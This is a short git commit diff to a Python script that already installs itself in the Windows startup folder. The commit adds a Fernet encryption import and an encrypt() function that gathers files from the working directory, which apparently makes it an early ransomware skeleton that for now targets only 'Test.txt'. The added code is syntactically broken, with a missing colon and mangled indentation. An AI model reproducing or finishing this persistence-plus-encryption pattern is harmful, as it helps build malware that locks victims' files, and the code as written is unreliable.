f49e98246b086548264a98136414f280d27967b9
TheNewGuardian <info.thenewguardian@gmail.com>
2024-09-27 18:22:18 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,9 @@
 import os
 import sys
+from cryptography.fernet import Fernet
+
+files = []
+Key = []
 
 def autostart():
     # Pfad zum Autostart-Ordner des aktuellen Benutzers
@@ -13,6 +17,14 @@ def autostart():
     with open(shortcut_path, 'w') as shortcut_file:
         # Fügt den Befehl hinzu, um das Python-Skript auszuführen
         shortcut_file.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"')
+
+def encrypt()
+    for file in os.listdir():
+#  if file == "main.py" :
+#    continue
+  if file !="Test.txt":
+    continue
+  files.append(file)
 
 #if __name__ == '__main__':
 #    autostart()
